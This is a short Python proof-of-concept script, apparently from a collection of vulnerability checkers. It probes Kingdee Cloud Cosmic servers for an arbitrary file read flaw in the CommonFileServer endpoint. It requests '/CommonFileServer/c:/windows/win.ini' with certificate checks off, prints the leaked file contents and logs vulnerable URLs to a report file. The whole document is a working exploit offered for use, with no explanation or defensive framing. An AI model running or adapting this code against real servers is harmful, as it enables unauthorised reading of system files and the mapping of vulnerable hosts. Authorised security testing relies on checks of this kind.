import requests
import time
import buter

filename = "./reps/金蝶云星空CommonFileserver任意文件读取-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc ='/CommonFileServer/c:/windows/win.ini'

def kdcsscafileread(url):
    try:
        rep = requests.get(url=url + poc, verify=False, timeout=3)
        if rep.status_code ==200:
            print(buter.colors.GREEN + f"存在金蝶云星空CommonFileserver任意文件读取 url : {url}{poc}" + buter.colors.END)
            print(rep.text)
            f = open(filename,"a+",encoding="utf-8")
            f.write(rep.url)
            f.write("\n")
            f.close()
        else:
            print(buter.colors.RED + f"未发现金蝶云星空CommonFileserver任意文件读取 url : {url}" + buter.colors.END)

    except Exception as e:
        print(buter.colors.END + f"ERROR : {e}" + buter.colors.END)
